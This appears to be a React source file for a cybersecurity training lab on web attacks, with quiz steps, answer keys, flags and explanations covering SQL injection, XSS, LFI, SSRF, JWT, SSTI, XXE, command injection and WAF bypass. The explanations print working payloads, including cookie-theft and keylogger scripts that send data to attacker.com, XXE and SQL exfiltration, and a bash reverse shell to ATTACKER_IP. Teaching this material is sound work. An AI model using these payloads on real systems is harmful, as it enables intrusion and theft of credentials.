'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00d4ff'
const moduleId = 'web-attacks'
const moduleName = 'Web Attacks'
const moduleNum = '06'

const steps: LabStep[] = [

  // ── SECTION 1: Recon & Mapping ────────────────────────────────────────────────
  {
    id: 'web-01',
    title: 'Web Application Fingerprinting',
    objective: `Before testing a web app you identify its tech stack — this tells you which vulnerabilities to prioritise. WhatWeb is a fingerprinting tool that probes HTTP headers, HTML content, and JavaScript to identify CMS, frameworks, web server, and language.

What WhatWeb command performs an aggressive scan (more probes, slower, more accurate) against a target?`,
    hint: 'WhatWeb has an aggression level flag. -a 3 is aggressive mode.',
    answers: ['whatweb -a 3', 'whatweb --aggression 3', 'whatweb -a3', 'whatweb'],
    xp: 15,
    explanation: `whatweb -a 3 http://target.com

Aggression levels:
  1 — passive (just looks at visible headers and HTML)
  3 — aggressive (sends extra probes, checks for specific files, slower)
  4 — heavy aggressive (many requests, can trigger WAF/rate limits)

What WhatWeb identifies:
  CMS       — WordPress, Joomla, Drupal, Typo3 (each has a CVE catalogue)
  Framework — Ruby on Rails, Laravel, Django, ASP.NET
  Web server — Apache 2.4.49, Nginx 1.18, IIS 10.0 (version = CVE matching)
  Language   — PHP version, Python, Node.js
  Headers    — X-Powered-By, Server, X-Frame-Options, CSP headers

Other fingerprinting approaches:
  curl -I http://target        — HTTP headers (Server, X-Powered-By)
  wappalyzer browser extension — visual fingerprinting in browser
  builtwith.com                — passive fingerprinting via DNS/headers
  nikto -h http://target       — web server misconfiguration scanner

Framework-specific findings:
  WordPress → /wp-login.php exists, xmlrpc.php for brute-force, /wp-content/uploads/ for shells
  Joomla    → /administrator, /configuration.php-dist for backups
  Laravel   → .env file exposure (database creds), debug mode (stack traces with secrets)`
  },

  {
    id: 'web-02',
    title: 'Burp Suite — Intercepting and Modifying Requests',
    objective: `Burp Suite is the industry-standard web application testing proxy. It sits between your browser and the server, letting you intercept, inspect, and modify every request and response.

You are intercepting a login POST request. You want to send this request to the Repeater tool so you can modify and replay it multiple times without re-intercepting. What keyboard shortcut sends the current intercepted request to Repeater?`,
    hint: 'The Repeater shortcut in Burp Suite is Ctrl+R.',
    answers: ['ctrl+r', 'ctrl r', 'Ctrl+R', 'send to repeater'],
    xp: 15,
    explanation: `Burp Suite core workflow:

  Proxy → Intercept → Modify → Forward (Ctrl+F)

Key tools:
  Proxy Intercept  — pause and modify requests in flight
  Repeater (Ctrl+R) — replay and iterate on a single request (best for manual testing)
  Intruder (Ctrl+I) — automated payload injection (brute-force, fuzzing, parameter testing)
  Scanner          — automated vulnerability detection (Burp Pro only)
  Decoder          — encode/decode base64, URL, HTML, JWT, hex
  Comparer         — diff two responses (useful for blind SQLi, auth testing)

Setup:
  1. Set browser proxy to 127.0.0.1:8080
  2. Import Burp's CA certificate[](http://burpsuite/cert) → trust in browser
  3. Navigate to target — requests appear in Proxy > HTTP History

Useful Repeater techniques:
  - Modify cookie value → test session fixation, cookie manipulation
  - Change Content-Type → trigger parser confusion (JSON vs XML)
  - Add/remove headers → test CORS, Host header injection
  - Inject payloads in parameters → SQLi, XSS, SSTI, SSRF testing

Intruder attack types:
  Sniper     — one payload at a time per marked position
  Battering Ram — same payload inserted into all positions simultaneously
  Pitchfork  — parallel payload lists for each position (username list + password list)
  Cluster Bomb — cartesian product of multiple payload lists (all combinations)`
  },

  // ── SECTION 2: Injection Attacks ─────────────────────────────────────────────
  {
    id: 'web-03',
    title: 'SQL Injection — Types and Detection',
    objective: `You are testing a web application's search endpoint: http://target.com/search?q=laptop

Inserting a single quote causes a database error. You then test for time-based blind SQLi by injecting a payload that causes a 5-second delay if the database is MySQL.

What MySQL function causes a sleep delay in a SQL injection payload?`,
    hint: 'MySQL has a SLEEP() function. The payload would be: 1 AND SLEEP(5)-- or similar.',
    answers: ['sleep(5)', 'SLEEP(5)', 'sleep', 'and sleep(5)', '1 AND SLEEP(5)--'],
    xp: 20,
    explanation: `SQL injection types:

  In-band Error-based: database error messages contain data
    ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--

  In-band Union-based: append UNION SELECT to extract data in same response
    ' UNION SELECT null, username, password FROM users--

  Blind Boolean-based: no output, but different responses for true/false
    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--

  Blind Time-based: no output, but delays confirm injection
    MySQL:    ' AND SLEEP(5)--
    MSSQL:    '; WAITFOR DELAY '0:0:5'--
    PostgreSQL: '; SELECT pg_sleep(5)--
    Oracle:   ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

  Out-of-band: exfiltrate via DNS or HTTP (rare, but powerful in filtered environments)
    ' AND LOAD_FILE('\\\\attacker.com\\file')--  (MySQL with FILE privilege)

SQLMap automation:
  sqlmap -u "http://target/search?q=1" --dbs           — enumerate databases
  sqlmap -u "http://target/search?q=1" -D mydb --tables — enumerate tables
  sqlmap -u "http://target/search?q=1" -D mydb -T users --dump  — dump users table
  sqlmap -u "http://target/search?q=1" --level=5 --risk=3 --batch — aggressive detection
  sqlmap -u "http://target/login" --data="user=a&pass=b" --dbs   — POST injection

Second-order SQLi: payload stored in DB, injected when retrieved later (bypasses input sanitisation on write path if read path is vulnerable).`
  },

  {
    id: 'web-04',
    title: 'Cross-Site Scripting (XSS) — Reflected, Stored, DOM',
    objective: `You find a search field that reflects input back into the page without sanitisation. You need to test whether JavaScript executes.

A WAF is blocking the classic script alert payload. What is a common alternative XSS vector that doesn't use the word "script" — using an image tag with an onerror event handler?`,
    hint: 'Use an img tag with a broken src and onerror=alert(1). Example: img src=x onerror=alert(1)',
    answers: [
      '<img src=x onerror=alert(1)>',
      'img src=x onerror=alert(1)',
      '<img onerror=alert(1) src=x>',
      'onerror=alert(1)',
      '<svg onload=alert(1)>'
    ],
    flag: 'FLAG{xss_bypassed}',
    xp: 20,
    explanation: `XSS types and their impact:

  Reflected XSS: payload in URL parameter → server reflects it → attacker sends victim the URL
    Impact: one-time execution in victim's browser (phishing links, BeEF hooking)

  Stored XSS: payload stored in database → served to all future visitors
    Impact: persistent execution (every visitor to a forum post gets the payload)
    Targets: comment fields, profile names, product reviews, log messages

  DOM-based XSS: payload processed by client-side JavaScript without server interaction
    Target: URL fragments (window.location.hash), localStorage reads fed into innerHTML

Real XSS attack payloads:
  Cookie theft (sends session to attacker):
    <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

  Keylogger injection:
    <script>document.onkeypress=function(e){fetch('https://attacker.com/k?key='+e.key)}</script>

  BeEF hooking (browser exploitation framework):
    <script src="http://attacker.com:3000/hook.js"></script>

XSS filter bypass techniques:
  Case variation:      <ScRiPt>alert(1)</sCrIpT>
  Tag attribute:       <img src=x onmouseover=alert(1)>
  JavaScript URL:      <a href="javascript:alert(1)">click</a>
  SVG/MathML:         <svg onload=alert(1)>
  Template injection:  {{7*7}} (if reflected, may indicate SSTI, not XSS)
  HTML encoding:       &#x3C;script&#x3E;

Content Security Policy (CSP) defence:
  Prevents inline JS execution and restricts allowed script sources
  Check with: curl -I target | grep Content-Security-Policy`
  },

  {
    id: 'web-05',
    title: 'Local File Inclusion (LFI) — Reading Server Files',
    objective: `A PHP application has a URL pattern: http://target.com/index.php?page=about

You suspect the PHP code is doing something like: include($_GET['page'] . '.php');

If you can traverse out of the web root using ../ sequences, you can read arbitrary server files. What payload would attempt to read /etc/passwd?`,
    hint: 'Use ../ to traverse up directories. You need to go up enough levels to reach / then read etc/passwd.',
    answers: [
      '../../../../etc/passwd',
      '../../../etc/passwd',
      '../../etc/passwd',
      '../../../../../../../../etc/passwd',
      '/etc/passwd'
    ],
    xp: 20,
    explanation: `LFI URL: http://target.com/index.php?page=../../../../etc/passwd

If the .php extension is appended automatically, the include would try to open /etc/passwd.php (which doesn't exist). Bypass techniques:
  Null byte:   ../../../../etc/passwd%00  (terminated before .php — PHP < 5.3.4)
  Path length: pad with /./ to exceed max path length
  Double encoding: %252e%252e%252f (URL double-encode the ../)

Useful files to read via LFI:
  /etc/passwd           — usernames and UIDs (not passwords if shadow is used)
  /etc/shadow           — hashed passwords (requires root-level read permission)
  /etc/hosts            — internal hostnames / IPs
  /proc/self/environ    — process environment variables (may contain credentials)
  /var/log/apache2/access.log  — web access logs (log poisoning for RCE)
  ~/.ssh/id_rsa         — SSH private key (if webserver runs as a user with one)
  /var/www/html/config.php     — database credentials
  /proc/self/cmdline    — current process arguments

Log Poisoning → LFI to RCE:
  1. Inject PHP code in User-Agent: curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
  2. Your UA is logged to access.log
  3. LFI the log: ?page=../../../../var/log/apache2/access.log&cmd=whoami
  → The PHP in the log executes

Remote File Inclusion (RFI):
  If allow_url_include is On: ?page=http://attacker.com/shell.txt
  → Includes and executes attacker-hosted PHP file (rare in modern configs)`
  },

  {
    id: 'web-06',
    title: 'Server-Side Request Forgery (SSRF)',
    objective: `You find a web application that fetches external URLs on behalf of the user: http://target.com/fetch?url=https://api.example.com/data

You suspect you can make the server fetch internal resources that aren't accessible from outside. What URL would you try to access the AWS EC2 instance metadata service — a goldmine that often returns IAM credentials?`,
    hint: 'The AWS instance metadata service is available at a link-local IP: 169.254.169.254',
    answers: [
      'http://169.254.169.254',
      'http://169.254.169.254/latest/meta-data/',
      '169.254.169.254',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    ],
    flag: 'FLAG{ssrf_cloud_pwned}',
    xp: 20,
    explanation: `SSRF: you trick the server into making requests you specify — potentially to internal services.

AWS metadata via SSRF:
  URL: http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  → Returns IAM role name

  Then fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  → Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)

AWS IMDSv2 (newer, mitigates SSRF):
  Requires a PUT request to get a token first, then token in header
  Some SSRF techniques can still bypass this via redirect chains

High-value SSRF targets:
  http://169.254.169.254/        — AWS/GCP/DigitalOcean/Azure metadata
  http://metadata.google.internal/  — GCP metadata (different endpoint)
  http://192.168.x.x/            — internal hosts not accessible from internet
  http://localhost:6379/           — Redis (often no authentication, arbitrary write)
  http://localhost:9200/           — Elasticsearch (data exfiltration)
  http://localhost:27017/          — MongoDB
  http://localhost:2375/           — Docker API (RCE on containers)
  file:///etc/passwd               — read local files (if file:// scheme is supported)

SSRF bypass techniques (when http:// is blocked):
  http://0177.0.0.1   — octal notation for 127.0.0.1
  http://0x7f000001   — hex notation for 127.0.0.1
  http://127.1         — shortened localhost
  http://[::1]         — IPv6 localhost
  Redirect chains: host a redirect at attacker.com → 127.0.0.1 (SSRFs that follow redirects)

Defence: allowlist of permitted URL schemes/hosts, block RFC1918 addresses, disable metadata endpoint access at cloud provider level (IMDS hop count limit).`
  },

  // ── SECTION 3: Authentication & Session Attacks ──────────────────────────────
  {
    id: 'web-07',
    title: 'Broken Authentication — JWT Attacks',
    objective: `JSON Web Tokens (JWT) are used for authentication in many modern web apps. A JWT has three base64-encoded parts: header.payload.signature

You intercept a JWT with the header: {"alg":"HS256","typ":"JWT"}

A classic attack changes the algorithm to "none" to remove signature verification. What do you change the "alg" field to in this attack?`,
    hint: 'The algorithm value for "no signature" in the JWT none attack is the string: none',
    answers: ['none', '"none"', 'alg none', 'algorithm none'],
    xp: 20,
    explanation: `JWT none algorithm attack:

  Original header (base64): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  Decoded: {"alg":"HS256","typ":"JWT"}

  Attack:
  1. Decode the header → change "alg" to "none"
  2. Decode the payload → change "role":"user" to "role":"admin"
  3. Remove the signature portion
  4. Re-encode and send: <new_header>.<new_payload>.

  Vulnerable servers that don't verify the algorithm accept this forged token.

Other JWT attacks:

  Algorithm confusion (RS256 → HS256):
    If server uses RS256 (asymmetric), the public key is often publicly available.
    Attack: change alg to HS256, sign with the public key as the HMAC secret.
    Some servers use the same key for both and accept either algorithm.

  Weak secret brute-force (HS256):
    jwt_tool -t TOKEN -C -d rockyou.txt    — crack the HMAC signing secret
    hashcat -m 16500 jwt.hash rockyou.txt   — GPU-accelerated JWT cracking

  Kid injection (key injection header):
    The "kid" (key ID) header field may be used in a SQL query or file path
    kid: ../../dev/null   → key becomes empty string → sign with empty string
    kid: anything' UNION SELECT 'attacker_key'-- → SQL injection in key lookup

jwt_tool workflow:
  jwt_tool TOKEN -T   — tamper mode (interactive modification)
  jwt_tool TOKEN -X a — test algorithm attacks
  jwt_tool TOKEN -X s — test signature stripping

Defence: validate algorithm explicitly server-side, use short expiry (exp claim), store JWTs securely (httpOnly cookies, not localStorage), use refresh token rotation.`
  },

  {
    id: 'web-08',
    title: 'Insecure Direct Object Reference (IDOR)',
    objective: `After logging in, you notice your profile URL is: http://target.com/profile?id=1042

You change the id parameter to 1041 and see another user's profile. This is an IDOR (Insecure Direct Object Reference) vulnerability — one of the most common and impactful web vulnerabilities.

What HTTP status code would you expect from the original /profile?id=1042 endpoint when you are accessing your own profile?`,
    hint: 'A successful HTTP response returns status code 200 (OK). You are looking for what the normal response code is, before testing IDOR.',
    answers: ['200', '200 OK', 'HTTP 200'],
    flag: 'FLAG{idor_found}',
    xp: 15,
    explanation: `IDOR occurs when an application uses user-controlled input to access objects (database records, files, user accounts) without verifying the requester has permission to access that specific object.

Testing methodology:
  1. Identify references: URL parameters, POST body, cookies, headers containing IDs
  2. Change the reference to another user's (e.g., increment, decrement, try known IDs)
  3. Check: does the response reveal another user's data?
  4. Check PUT/DELETE: can you modify or delete another user's data?

IDOR examples:
  /api/v1/orders/12345            → change to /api/v1/orders/12344 → another user's order
  POST /api/updateEmail {"id":42} → change to {"id":43} → update another user's email
  /download?file=report_user42.pdf → traverse to report_user41.pdf

Indirect IDOR:
  /reset-password?token=abc123   → token generated from username → enumerate usernames
  /export?format=csv&report=weekly → change report ID

Mass assignment / parameter pollution:
  POST /api/user/update with body: {"name":"attacker","role":"admin"}
  If the API doesn't filter writable fields, you can escalate your own role

Testing with Burp Intruder:
  Mark the ID value as a payload position → Numbers payload → range 1-10000 → run
  Filter responses by Content-Length (a different length usually means different content = IDOR)

Reporting IDOR:
  Document the exact parameter, what data was exposed, impact (PII, financial, admin access).
  IDOR in critical functionality (password reset, admin panel) is typically High/Critical CVSS.`
  },

  // ── SECTION 4: Advanced Web Attacks ──────────────────────────────────────────
  {
    id: 'web-09',
    title: 'Server-Side Template Injection (SSTI)',
    objective: `You are testing a web app that uses Jinja2 (Python template engine). You inject {{7*7}} into a search field and the page shows "49" instead of reflecting the string literally. This confirms SSTI.

What Jinja2 SSTI payload would execute the system command "id" and display the output?`,
    hint: 'Use Python class traversal to reach os.popen. A common payload uses config.class.__init__.__globals__ to access os.',
    answers: [
      '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
      '{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}',
      "{{''.__class__.__mro__[1].__subclasses__()}}",
      '{{7*7}}'
    ],
    xp: 20,
    explanation: `SSTI occurs when user input is embedded directly in a template string that gets rendered server-side.

Jinja2 (Python/Flask/Django):
  Detection: {{7*7}} → 49 confirms Jinja2 SSTI

  RCE payload:
  {{config.__class__.__init__.__globals__["os"].popen("id").read()}}

  Alternative (class traversal):
  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
  → Accesses file open class through Python's MRO (Method Resolution Order)

Template engine detection matrix:
  {{7*7}}       → 49   = Jinja2 or Twig
  ${7*7}        → 49   = Freemarker or Smarty
  #{7*7}        → 49   = Ruby (ERB)
  *{7*7}        → 49   = Spring EL (Java)
  {{7*'7'}}     → 7777777 = Jinja2 (7 repeated 7 times)
  {{7*'7'}}     → 49   = Twig

Twig (PHP) RCE:
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

Freemarker (Java) RCE:
  &#123;"freemarker.template.utility.Execute"?new()("id")&#125;

Automated SSTI testing:
  tplmap -u "http://target/search?q=test"   — auto-detects engine and exploits

  tplmap --os-shell   — interactive shell via SSTI
  tplmap --os-cmd "whoami"

Defence: never concatenate user input into template strings. Use template engine sandboxing. Validate that template variables only reference safe data objects, not raw strings.`
  },

  {
    id: 'web-10',
    title: 'XML External Entity (XXE) Injection',
    objective: `A web application accepts XML in a POST request. You notice the Content-Type is application/xml. You want to test for XXE — an attack that defines an external entity in the DOCTYPE to make the XML parser fetch arbitrary files or URLs.

What DOCTYPE declaration defines an external entity "xxe" that reads /etc/passwd?`,
    hint: 'XXE DOCTYPE syntax: <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    answers: [
      '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
      'DOCTYPE ENTITY SYSTEM file:///etc/passwd'
    ],
    flag: 'FLAG{xxe_executed}',
    xp: 20,
    explanation: `Full XXE payload:
  <?xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

The XML parser expands &xxe; by reading /etc/passwd → contents appear in response.

XXE attack types:

  File read (classic):
    file:///etc/passwd, file:///etc/shadow, file:///var/www/html/config.php

  SSRF via XXE:
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    → Reaches internal AWS metadata (same as SSRF attack, but via XML)

  Blind XXE (out-of-band):
    No response returned, but server makes external request
    <!ENTITY xxe SYSTEM "http://attacker.com/?data=test">
    → Confirms XXE via DNS/HTTP interaction (use Burp Collaborator or interactsh)

    Blind exfiltration via parameter entity:
    <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
    Where evil.dtd on attacker server contains:
    <!ENTITY % data SYSTEM "file:///etc/passwd">
    <!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%data;'>">%param;

Testing for XXE:
  1. Change Content-Type to application/xml if JSON request
  2. Convert JSON payload to XML
  3. Inject DOCTYPE before the root element
  4. Use Burp Scanner / XXEinjector for automated testing

Defence: disable XML external entity processing in the parser (e.g., libxml_disable_entity_loader(true) in PHP, FEATURE_EXTERNAL_GENERAL_ENTITIES=false in Java). Use JSON instead of XML where possible. Validate/sanitise XML input.`
  },

  {
    id: 'web-11',
    title: 'Command Injection — OS Commands in Web Apps',
    objective: `A web application has a "ping check" feature: http://target.com/ping?host=google.com

The server runs a system command like: ping -c 1 google.com using the user-supplied host value. If the input isn't sanitised, you can append additional commands.

What character allows you to chain a second command after the ping command in Linux?`,
    hint: 'The semicolon ; runs the second command regardless of the first. The pipe | or && are also valid.',
    answers: [';', '&&', '|', '; id', '&& id', '| id'],
    xp: 20,
    explanation: `Command injection chaining operators:

  ;       — run second command regardless of first result
    ping -c 1 google.com; id

  &&      — run second command only if first succeeds
    ping -c 1 google.com && cat /etc/passwd

  ||      — run second command only if first FAILS
    ping -c 1 DOESNOTEXIST || id

  |       — pipe output of first to second
    ping -c 1 google.com | id

  backtick — execute and substitute: ping &#96;id&#96;
  $()     — execute and substitute: ping $(id)

Blind command injection (no output in response):
  Time-based: ; sleep 5 — if response takes 5 seconds, injection confirmed
  Out-of-band: ; curl http://attacker.com/$(id) — exfiltrate via DNS or HTTP

Full reverse shell via command injection:
  ; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

URL-encoded (for GET parameters):
  %3B%20id  = ; id
  %0A       = newline (sometimes accepted where semicolon is blocked)

Commix (automated command injection):
  commix --url="http://target/ping?host=INJECT_HERE"

Filter bypass techniques:
  ${IFS} instead of space (IFS = Internal Field Separator, default is space)
  cat${IFS}/etc/passwd

  Base64: echo "aWQ=" | base64 -d | bash (executes "id")

  Wildcard: /b?n/id, /bin/i? — for when literal strings are filtered

Defence: use parameterised system calls or exec arrays (never build OS command strings from user input), validate input against strict allowlist, run web services as minimal-privilege users.`
  },

  {
    id: 'web-12',
    title: 'WAF Bypass Techniques',
    objective: `A Web Application Firewall (WAF) is blocking your SQL injection payloads. It blocks the word "UNION" and "SELECT".

What SQL injection bypass technique uses comment syntax to break up blocked keywords?`,
    hint: 'SQL comments /**/ can be inserted inside keywords: UN/**/ION SE/**/LECT — the DB assembles them, the WAF pattern doesn't match.',
    answers: [
      'UN/**/ION',
      'UNION/**/SELECT',
      '/**/UNION/**/SELECT',
      'UN/**/ION SE/**/LECT',
      'comment injection'
    ],
    flag: 'FLAG{waf_bypassed}',
    xp: 20,
    explanation: `WAF bypass taxonomy:

  Inline comments (MySQL, MSSQL):
    UN/**/ION SE/**/LECT 1,2,3--
    OR 1=1 becomes OR/**/1=1

  URL encoding:
    %27 = '   %20 = space   %23 = #
    UNION%20SELECT → UNION SELECT (simple WAF won't decode)

  Double URL encoding:
    %2527 = %27 after first decode = ' after second decode

  Case variation:
    UnIoN SeLeCt  — case-insensitive SQL engines, case-sensitive WAF patterns

  HTML encoding (in reflected contexts):
    &#x27; = '   &#x55;&#x4e;&#x49;&#x4f;&#x4e; = UNION

  Whitespace substitutes (MySQL):
    TAB (%09), newline (%0a), carriage return (%0d), form feed (%0c), vertical tab (%0b)
    UNION%0aSELECT

  Scientific notation (MySQL numeric contexts):
    1e0 UNION = 1 UNION
    1.0e0 OR 1=1

  Charset confusion:
    Some WAFs parse UTF-8 differently than the database, creating detection gaps

  HTTP parameter pollution:
    ?id=1&id=2 UNION SELECT — some parsers concatenate or take last value

Tools for WAF identification and bypass:
  wafw00f http://target.com       — identify WAF product
  sqlmap --tamper=space2comment   — tamper scripts that transform payloads
  sqlmap --tamper=between,space2randomblank,randomcase  — stack tampers

Note: WAF bypasses are highly WAF-specific. What works on ModSecurity may not work on CloudFlare. Always enumerate the WAF product first.`
  },

]

export default function WebAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  const sections = [
    { num: '01-02', title: 'Recon — Fingerprinting & Burp Suite', color: accent },
    { num: '03-06', title: 'Injection — SQLi, XSS, LFI, SSRF', color: accent },
    { num: '07-08', title: 'Authentication — JWT & IDOR', color: accent },
    { num: '09-11', title: 'Advanced — SSTI, XXE, CMDi', color: accent },
    { num: '12',    title: 'WAF Bypass Techniques', color: accent },
  ]

  useEffect(() => {
    const saved = localStorage.getItem('lab_web-attacks-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#004a5a' }}>
        <Link href="/" style={{ color: '#004a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/web-attacks" style={{ color: '#004a5a', textDecoration: 'none' }}>WEB ATTACKS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/web-attacks" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #003a4a', borderRadius: '3px', color: '#004a5a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(0,212,255,0.04)', border: '1px solid rgba(0,212,255,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#003a4a', border: p.active ? '2px solid ' + accent : '1px solid #003a4a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#004a5a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#003a4a', margin: '0 2px' }}>&#8212;</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a8a9a' }}>
          MOD-{moduleNum} &nbsp;&#183;&nbsp; {moduleName.toUpperCase()} &nbsp;&#183;&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE &#8212; LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#004a5a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 &#8212; GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Web Attacks Lab</h1>
          </div>
        </div>

        <p style={{ color: '#3a8a9a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          SQLi, XSS, LFI, SSRF, JWT attacks, IDOR, SSTI, XXE, command injection, and WAF bypass.
          Complete all {steps.length} steps to unlock Phase 2.
        </p>

        {/* Section index */}
        <div style={{ background: 'rgba(0,212,255,0.03)', border: '1px solid rgba(0,212,255,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#003a4a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '6px' }}>
            {sections.map((s) => (
              <div key={s.num} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 8px', background: 'rgba(0,212,255,0.04)', borderRadius: '4px', border: '1px solid rgba(0,212,255,0.08)' }}>
                <span style={{ fontSize: '7px', color: s.color, fontWeight: 700, minWidth: '32px' }}>{s.num}</span>
                <span style={{ fontSize: '7.5px', color: '#3a8a9a' }}>{s.title}</span>
              </div>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="web-attacks-lab"
          moduleId={moduleId}
          title="Web Attacks Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(0,212,255,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.4)' : '#003a4a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#004a5a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#3a8a9a' : '#004a5a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 &#8212; FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#004a5a' }}>Full Web Attacks Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, background: 'rgba(0,212,255,0.08)', border: '1px solid rgba(0,212,255,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(0,212,255,0.04)' : '#060809', border: '1px solid ' + (guidedDone ? 'rgba(0,212,255,0.25)' : '#002a3a'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
